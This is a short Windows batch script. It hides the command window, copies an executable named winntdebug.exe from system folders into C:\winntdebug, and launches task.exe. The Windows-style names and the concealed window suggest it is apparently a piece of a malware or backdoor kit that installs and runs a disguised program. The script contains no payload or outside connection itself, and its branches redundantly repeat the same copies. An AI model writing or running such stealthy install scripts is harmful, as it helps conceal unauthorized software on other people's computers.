@echo off
if exist winntdebug.exe goto :end
hide /hide "C:\WINNT\System32\cmd.exe"
copy C:\winnt\winntdebug.exe C:\winntdebug\winntdebug.exe
copy C:\winnt\system32\winntdebug.exe C:\winntdebug\winntdebug.exe
task.exe
exit
:end
copy C:\winnt\winntdebug.exe C:\winntdebug\winntdebug.exe
copy C:\winnt\system32\winntdebug.exe C:\winntdebug\winntdebug.exe
exit